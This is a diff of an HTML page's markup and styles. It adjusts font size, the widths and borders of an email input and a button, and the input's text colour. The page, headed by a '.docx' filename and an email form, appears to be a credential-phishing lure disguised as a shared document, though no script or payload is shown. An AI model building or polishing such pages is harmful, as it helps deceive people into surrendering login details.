@@ -25,7 +25,7 @@
         <div class="content">
           <img src="https://i.postimg.cc/s2TBQ89k/ldimg1.png" width="90" height="30" />
           
-          <p style="font-size: 18px; font-weight: bold; color: #333333;">FA65478-06-17-2025.docx</p>
+          <p style="font-size: 17px; font-weight: bold; color: #333333;">FA65478-06-17-2025.docx</p>
          
 
           <div class="form-wrapper">
@@ -247,13 +247,13 @@ body {
 }
 
 .email-input {
-  width: 88%;
+  width: 93%;
   padding: 0.6rem;
-  border: 0.6px solid #e1e1e1;
+  border: 0.9px solid #e1e1e1;
   border-radius: 5px;
   font-size: 1rem;
   background-color: #fff;
-  color: #000;
+  color: #e1e1e1;
 }
 
 .error {
@@ -271,7 +271,7 @@ body {
   border-radius: 5px;
   cursor: pointer;
   font-size: 1rem;
-  width: 95%;
+  width: 99%;
   transition: background-color 0.2s ease;
 }
 
